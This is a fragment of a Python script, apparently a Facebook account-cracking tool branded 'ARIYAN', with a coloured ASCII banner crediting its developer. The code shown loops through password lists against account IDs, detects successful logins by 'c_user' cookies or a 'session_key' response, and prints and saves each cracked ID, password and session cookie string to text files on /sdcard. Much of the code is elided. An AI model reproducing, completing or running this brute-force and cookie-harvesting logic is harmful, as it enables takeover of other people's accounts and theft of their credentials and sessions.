...
def ____banner____():
    ...
    print(f"""  \x1b[38;5;40  /\   |  __ \|_   _\ \   / //\   | \ | |
    /  \  | |__) | | |  \ \_/ //  \  |  \| |
   / /\ \ |  _  /  | |   \   // /\ \ | . ` |
  / ____ \| | \ \ _| |_   | |/ ____ \| |\  |
 /_/    \_\_|  \_\_____|  |_/_/    \_\_| \_| {white}V{green}/{white}FCK
{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{rad}[{white}◆{rad}] {green}DEVELOPER  {white}▶︎ {green} ARIYAN CHOWDHURY 
{rad}[{white}◆{rad}] {green}FACEBOOK   {white}▶︎ {green}ARIYAN CHOWDHURY 
{rad}[{white}◆{rad}] {green}TOOLTYPE   {white}▶︎ {green}FREE{white}{rad}┼{faltu}{rad}FILE & RANDOM{pvt}{green}{rad}┼
{rad}[{white}◆{rad}] {green}GITHUB     {white}▶︎ {rad}({white}ARIYAN-143{rad})
{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    ...
    try:
        for pas in passlist:
            ...
            if 'c_user' in log_cookies:
                ...
                if 'Photoshop' in res:
                    if "Y" in ck:
                        print(f'\r\r{rad}[{green}ARIYAN-💚{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
                        print(f'\r\r\x1b[38;5;46m=[🍪]= {green}{coki}');linex()
                        open('/sdcard/ARIYAN-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/MAHADI-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
                        oks.append(cid)
                        break
                    else:
                        print(f'\r\r{rad}[{green} ARIYAN -💚{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
    ...
    try:
        ...
        for fikr in passlist:
            ...
            if 'session_key' in q:
                ...
                cookies = response_data.get("session_cookies")
                coki = ";".join(i["name"] + "=" + i["value"] for i in cookies)
                print(f'\r\r{rad}[{green}ARIYAN-💚{rad}]{green} {ids} {rad}▶︎ {green}{pas}')
                oks.append(ids)
